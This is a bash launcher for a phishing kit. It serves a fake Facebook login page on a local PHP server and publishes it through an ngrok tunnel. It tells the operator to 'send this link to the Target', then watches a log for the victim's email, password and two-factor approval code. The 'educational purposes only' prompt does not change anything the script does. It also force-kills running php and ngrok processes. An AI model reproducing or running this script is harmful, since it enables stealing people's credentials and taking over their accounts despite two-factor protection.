#!/bin/bash
clear
echo ""
echo ""
echo ""
printf "\e[1;33m[\e[0m <<>> \e[1;33m] NGROK SERVER : TURN ON MOBILE DATA & HOTSPOT AND GET START !\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
read -p $'\e[1;32m\e[0m\e[1;32mT H I S - T O O L - F O R - E D U C A T I O N A l - P U R P O S E S - O N L Y ? \e[1;33m\e[0m\e[1;33m (Y/N) : \e[0m' option
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
chmod 777 Logo.sh
./Logo.sh
echo ""
echo -e $'\e[1;32m\e[0m\e[1;32m SELECT ANY ATTACK \e[0m'
echo -e $'\e[1;37m\e[0m\e[1;37m --------------------- > > >\e[0m'
echo ""
banner(){

printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Facebook-TFO\e[0m \e[0m\n" 

}
banner
echo ""
echo ""

read -p $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m Enter Your Choice : \e[0m' option
		 case $option in 
			 

	 
	 1)cd sites/
cd facebook/
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
./ngrok http 4444 > /dev/null 2>&1 &
sleep 25
echo ""
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
echo ""
echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL // \e[0m'
echo ""
tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"


;;


99)echo -e $'\e[1;32m[\e[0m\e[1;77m+\e[0m\e[1;32m]\e[0m\e[1;33m >> THANKS FOR JOIN US >> \e[0m'
sleep 1
exit
;;


esac
;;
